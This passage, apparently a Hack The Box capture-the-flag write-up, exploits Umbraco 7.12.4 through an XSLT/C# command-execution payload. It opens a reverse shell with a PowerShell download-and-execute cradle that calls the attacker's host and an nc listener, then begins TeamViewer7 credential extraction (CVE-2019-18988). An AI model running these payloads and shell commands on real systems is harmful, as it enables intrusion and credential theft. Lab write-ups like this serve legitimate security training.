+&lt;p&gt;And we are in the website! Note that the Umbraco version used is 7.12.4.  Now, it’s time to find an exploit for this online. A quick Google search &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;umbraco 7.12.4 exploit&lt;/code&gt; leads to &lt;a href=&quot;https://www.exploit-db.com/exploits/49488&quot;&gt;this&lt;/a&gt; exploit. From the code, it seems to making a POST request to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&lt;/code&gt; endpoint with this payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;?xml version=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&amp;gt;&amp;lt;xsl:stylesheet version=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://www.w3.org/1999/XSL/Transform&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:msxsl=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;urn:schemas-microsoft-com:xslt&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:csharp_user=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://csharp.mycompany.com/mynamespace&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&amp;lt;msxsl:script language=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C#&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; implements-prefix=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;csharp_user&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;public string xml() { string cmd = &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  &amp;lt;/msxsl:script&amp;gt;&amp;lt;xsl:template match=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt; &amp;lt;xsl:value-of select=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;csharp_user:xml()&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&amp;gt; &amp;lt;/xsl:template&amp;gt; &amp;lt;/xsl:stylesheet&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
+&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From what I understood, this payload appears to be an XML file that uses XSLT with embedded C# code. XSLT is a language used for transforming XML documents into other formats. The payload is structured to not only perform a transformation but also execute C# code within the context of an XSLT processor that supports the msxsl:script extension.&lt;/p&gt;
+
+&lt;p&gt;The embedded C# code here is used to run arbitrary code passed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; switches. The exploit has a line that says:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#usage python exploit.py -u admin@example.org -p password123 -i &apos;http://10.0.0.1&apos; -c ipconfig
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s test it out!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin@htb.local &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baconandcheese &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; http://10.129.14.142 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : .htb
+   IPv6 Address. &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : dead:beef::8a
+   IPv6 Address. &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : dead:beef::d5a:847:7d7c:ae55
+   Link-local IPv6 Address &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : fe80::d5a:847:7d7c:ae55%12
+   IPv4 Address. &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : 10.129.14.142
+   Subnet Mask &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : 255.255.0.0
+   Default Gateway &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : fe80::250:56ff:feb9:2bb5%12
+                                       10.129.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Amazing! We are able to execute arbitrary code server-side. Now, we must think of a way to spawn a reverse shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;
+
+&lt;p&gt;Upon a long search, I ended up with this powershell script from &lt;a href=&quot;https://github.com/samratashok/nishang#anti-virus&quot;&gt;Nishang&lt;/a&gt;. As we can see, we can spawn a reverse shell if WIndows runs the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;yourwebserver&amp;gt;/Invoke-PowerShellTcp.ps1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-PowerShellTcp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Reverse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-IPAddress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Port&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PortNo.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, one way we could try to access the reverse shell is by running the exploit as this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin@htb.local &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baconandcheese &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.129.14.142&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmd.exe&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c powershell -c iex(new-object net.webclient).downloadstring(&apos;http://10.10.16.14/Invoke-PowerShellTcp.ps1&apos;);;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;For that to work, we need to run a Python server where our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; script is, and also run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4444&lt;/code&gt; to receive the shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;root: 
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then, in another tab:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and finally, we run the exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin@htb.local &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baconandcheese &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.129.14.142&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmd.exe&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c powershell -c iex(new-object net.webclient).downloadstring(&apos;http://10.10.16.14/Invoke-PowerShellTcp.ps1&apos;);;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In our netcat, we got a connection:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4444
+Connection from 10.129.14.142:49693
+Windows PowerShell running as user REMOTE&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;on REMOTE
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt;whoami
+iis apppool&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;efaultapppool
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, we are not root, but we have access to the system. Let’s now think of a way of escalate privileges.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---escalating-privileges&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Escalating privileges&lt;/h2&gt;
+
+&lt;p&gt;We first need to know where TeamViewer is running. For that, we can run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt; tasklist /svc
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+svchost.exe                   2200 W3SVC, WAS                                  
+vmtoolsd.exe                  2208 VMTools                                     
+TeamViewer_Service.exe        2216 TeamViewer7                                 
+svchost.exe                   2236 W32Time                                     
+MsMpEng.exe                   2244 WinDefend     
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we take a look on CVEs regarding TeamViewer7. After searching through lots of different CVEs, it seems that it is &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2019-18988/&quot;&gt;this&lt;/a&gt; one. Summarizing it, we have:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;TeamViewer Desktop through 14.7.1965 allows a bypass of remote-login access control because the same key is used for different customers’ installations. It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the current version of the product. If an attacker were to know this key, they could decrypt protect information stored in the registry or configuration files of TeamViewer. With versions before v9.x , this allowed for attackers to decrypt the Unattended Access password to the system (which allows for remote login to the system as well as headless file browsing). The latest version still uses the same key for OptionPasswordAES but appears to have changed how the Unattended Access password is stored. While in most cases an attacker requires an existing session on a system, if the registry/configuration keys were stored off of the machine (such as in a file share or online), an attacker could then decrypt the required password to login to the system.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Basically, TeamViewer7 uses a weak encryption algorithm that can be cracked. Upon some more research, I’ve found &lt;a href=&quot;https://github.com/mr-r3b00t/CVE-2019-18988&quot;&gt;this&lt;/a&gt; GitHub repo contaning the exploit. Somehow, we need to run it inside the CTF machine. To do that, save the exploit on our local machine, pop a Python server. On the host machine, let’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd C:\windows\temp\&lt;/code&gt; and then:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.10.16.14/exploit.bat&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;C:\windows\temp\exploit.bat&apos;&lt;/span&gt;
+PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;exploit.bat
+
+
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                  
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         1/6/2024  11:56 PM           1148 exploit.bat 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To run the exploit, we type in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.\exploit.bat&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; .&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;xploit.bat
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM &lt;span class=&quot;c&quot;&gt;# CVE-2019-18988 &lt;/span&gt;
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM &lt;span class=&quot;c&quot;&gt;# Teamviewer Local Privesc &lt;/span&gt;
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264 
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v Version 
+
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
+    Version    REG_SZ    7.0.43148
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 
+
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
+    StartMenuGroup    REG_SZ    TeamViewer 7
+    InstallationDate    REG_SZ    2020-02-20
+    InstallationDirectory    REG_SZ    C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
+    Always_Online    REG_DWORD    0x1
+    Security_ActivateDirectIn    REG_DWORD    0x0
+    Version    REG_SZ    7.0.43148
+    ClientIC    REG_DWORD    0x11f25831
+    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851